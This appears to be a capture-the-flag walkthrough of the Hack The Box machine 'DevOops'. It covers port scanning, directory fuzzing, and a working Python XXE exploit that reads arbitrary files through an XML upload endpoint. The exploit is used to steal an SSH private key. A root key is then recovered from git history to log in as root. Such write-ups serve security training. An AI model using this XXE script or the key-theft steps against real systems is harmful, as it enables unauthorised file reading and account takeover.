# [DevOops](https://app.hackthebox.com/machines/devoops)

```bash
nmap -p- --min-rate 10000  10.10.10.91 -Pn
```

![Alt text](img/image.png)

After discovering open ports(22,5000), let's do greater nmap scan.

```bash
nmap -A -sC -sV -p22,5000 10.10.10.91 -Pn
```

![Alt text](img/image-1.png)


Let's do Directory fuzzing for port (5000) on our target.

```bash
gobuster dir -u http://10.10.10.91:5000 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 40
```

![Alt text](img/image-2.png)


On '/**upload**' menu, I see that I can add 'XML' Files into machine.

![Alt text](img/image-3.png)

If there is XML files, it means that XXE attack (XML External Entity) should be happen.

I wrote malicious 'dr4ks.xml' file as below so that we can read '/etc/lsb-release' file content

![Alt text](img/image-4.png)

Let's upload this and see the result.

![Alt text](img/image-5.png)


Hola, it works.

Let's write Automation script that we enter filename into script and it reads for us.

```python
#!/usr/bin/python3

import re
import requests
import sys

if len(sys.argv) < 2:
    print(f"usage: {sys.argv[0]} [path to file]")
    sys.exit()

file_name = sys.argv[1]

xml = f'''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY dr4ks SYSTEM "file://{file_name}">
]>

<item>
<Author>
&dr4ks;
</Author>
<Subject>Testing</Subject>
<Content>This is a test</Content>
</item>'''

files = {'file': ('xxe.xml', xml, 'text/xml')}
try:
    r = requests.post('http://10.10.10.91:5000/upload', files=files)
    if r.status_code == 200:
        pattern = re.compile(r"Author: \n(.*)\n Subject:", flags=re.DOTALL)
        print(re.search(pattern, r.text).group(1).strip())
        sys.exit()
    else:
        pass
except requests.exceptions.ConnectionError:
    pass
print("[-] Unable to connect. Either site is down or file doesn't exist or can't be read by current user.")
```

Let's execute this script and add filename as input.

![Alt text](img/image-6.png)


I read '/etc/passwd' file to learn usernames of machine.

![Alt text](img/image-7.png)


One of the users is 'roosa', let's try to read private key (id_rsa) of this user.

![Alt text](img/image-8.png)

Let's login via this id_rsa.

```bash
chmod 600 id_rsa
ssh -i id_rsa roosa@10.10.10.91
```

user.txt

![Alt text](img/image-9.png)


For enumeration, I just searched for '.git' folder that I can get last commits of repository.

```bash
find / -type d -name '.git' 2>/dev/null
```

![Alt text](img/image-10.png)


Current status of repository.
```bash
git status
```

![Alt text](img/image-11.png)


Let's look at `git` history.

```bash
git log --name-only --oneline
```

![Alt text](img/image-12.png)


From here, we grab commit id (d387abf) which contains commit that 'authcredentials.key' file is located here.

Let's back to this (d387abf) commit as below.

```bash
git checkout d387abf -- resources/integration/authcredentials.key
```

Now, we can read content of this.

![Alt text](img/image-13.png)


Maybe this is private key (id_rsa) of root user, let's try to login.

```bash
chmod 600 id_rsa
ssh -i id_rsa root@10.10.10.91
```

root.txt

![Alt text](img/image-14.png)